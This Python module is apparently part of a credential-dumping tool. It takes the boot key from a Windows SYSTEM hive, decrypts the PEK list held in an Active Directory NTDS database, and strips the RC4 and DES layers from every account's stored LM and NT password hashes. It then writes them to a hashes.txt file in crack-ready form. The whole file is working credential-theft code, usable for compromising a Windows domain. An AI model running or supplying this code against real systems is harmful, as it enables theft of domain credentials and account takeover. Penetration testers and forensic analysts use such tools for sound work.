from impacket.examples.secretsdump import LocalOperations
from impacket.structure import Structure
from impacket.crypto import transformKey

from Cryptodome.Cipher import DES, ARC4
from six import PY2

from struct import unpack, pack
import hashlib,json


class CryptoCommon:
    def deriveKey(self, baseKey):
        key = pack('<L',baseKey)
        key1 = [key[0] , key[1] , key[2] , key[3] , key[0] , key[1] , key[2]]
        key2 = [key[3] , key[0] , key[1] , key[2] , key[3] , key[0] , key[1]]
        if PY2:
            return transformKey(b''.join(key1)),transformKey(b''.join(key2))
        else:
            return transformKey(bytes(key1)),transformKey(bytes(key2))


class SAMR_RPC_SID_IDENTIFIER_AUTHORITY(Structure):
    structure = (
        ('Value','6s'),
    )
class SAMR_RPC_SID(Structure):
    structure = (
        ('Revision','<B'),
        ('SubAuthorityCount','<B'),
        ('IdentifierAuthority',':',SAMR_RPC_SID_IDENTIFIER_AUTHORITY),
        ('SubLen','_-SubAuthority','self["SubAuthorityCount"]*4'),
        ('SubAuthority',':'),
    )
    def formatCanonical(self):
       ans = 'S-%d-%d' % (self['Revision'], ord(self['IdentifierAuthority']['Value'][5:6]))
       for i in range(self['SubAuthorityCount']):
           ans += '-%d' % ( unpack('>L',self['SubAuthority'][i*4:i*4+4])[0])
       return ans
    

class PEKLIST_ENC(Structure):
    structure = (
         ('Header','8s=b""'),
         ('KeyMaterial','16s=b""'),
         ('EncryptedPek',':'),
         )

class PEKLIST_PLAIN(Structure):
    structure = (
           ('Header','32s=b""'),
           ('DecryptedPek',':'),
           )

class PEK_KEY(Structure):
    structure = (
        ('Header','1s=b""'),
        ('Padding','3s=b""'),
        ('Key','16s=b""'),
        )
class CRYPTED_HASH(Structure):
    structure = (
            ('Header','8s=b""'),
            ('KeyMaterial','16s=b""'),
            ('EncryptedHash','16s=b""'),
        )  
    

def extractBootKey(systemHiveFile):
    localOperation = LocalOperations(systemHiveFile)
    return localOperation.getBootKey()


def removeRC4(PEK,cryptedhash):
    md5 = hashlib.new('md5')
    pekIndex = cryptedhash['Header'].hex()
    md5.update(PEK[int(pekIndex[8:10])])
    md5.update(cryptedhash['KeyMaterial'])
    tmpKey = md5.digest()
    rc4 = ARC4.new(tmpKey)
    plainText = rc4.encrypt(cryptedhash['EncryptedHash'])
    return plainText


def removeDESLayer(hash,rid,commonCrypto):
    Key1,Key2 = commonCrypto.deriveKey(int(rid))
    Crypt1 = DES.new(Key1, DES.MODE_ECB)
    Crypt2 = DES.new(Key2, DES.MODE_ECB)
    decryptedHash = Crypt1.decrypt(hash[:8]) + Crypt2.decrypt(hash[8:])
    return decryptedHash



def extractPEKKey(datatable,fields):
    for record in datatable.records():
        PekKey_ = record.get(fields["pekList"])
        if PekKey_ is not None:
            break

    return PekKey_

def decryptPEKKey(PekKey_,bootkey):
    encryptedPekList = PEKLIST_ENC(PekKey_)
    md5 = hashlib.new('md5')
    md5.update(bootkey)
    for i in range(1000):
        md5.update(encryptedPekList["KeyMaterial"])
    tmpKey = md5.digest()
    rc4 = ARC4.new(tmpKey)
    decryptedPekList = PEKLIST_PLAIN(rc4.encrypt(encryptedPekList['EncryptedPek']))

    PEKLen = len(PEK_KEY())
    PEKLIST = []
    for i in range(len( decryptedPekList['DecryptedPek'] ) // PEKLen ):
        cursor = i * PEKLen
        pek = PEK_KEY(decryptedPekList['DecryptedPek'][cursor:cursor+PEKLen])
        PEKLIST.append(pek['Key'])

    return PEKLIST

def getHash(record,fields,PEKLIST,commonCrypto):
    samaccountname = record.get(fields["sAMAccountName"])
    enclmhash = record.get(fields["dBCSPwd"])
    encnthash = record.get(fields["unicodePwd"])
    if enclmhash is not None and encnthash is not None:
        domain = record.get(fields["userPrincipalName"])
        if domain is None:
            domain = ""
        else:
            domain = domain.split("@")[-1] + "\\"
        enclmhash = CRYPTED_HASH(enclmhash)
        encnthash = CRYPTED_HASH(encnthash)

        sid = SAMR_RPC_SID(record.get(fields["objectSid"]))
        rid = sid.formatCanonical().split('-')[-1]
            
        LMHash = removeRC4(PEKLIST,enclmhash)
        LMHash = removeDESLayer(LMHash, rid,commonCrypto)
            
        NTHash = removeRC4(PEKLIST,encnthash)
        NTHash = removeDESLayer(NTHash, rid,commonCrypto)
        hash = domain + samaccountname + ":" + rid + ":" + LMHash.hex()+":" + NTHash.hex() + "\n"
        return hash
    else:
        pass


def dumpHashes(datatable,systemFile):
    print("[+] Hash dump Started")
    fields = json.loads(open("hashdump.json","r").read())
    PEKkeyenc = extractPEKKey(datatable,fields)
    bootkey = extractBootKey(systemFile)
    PEKLIST = decryptPEKKey(PEKkeyenc,bootkey)
    commonCrypto = CryptoCommon()

    with open("hashes.txt","w") as hashfile:
        for record in datatable.records():
            hash = getHash(record,fields,PEKLIST,commonCrypto)
            if hash is not None:
                hashfile.write(hash)

    print("[+] Hash dump done")   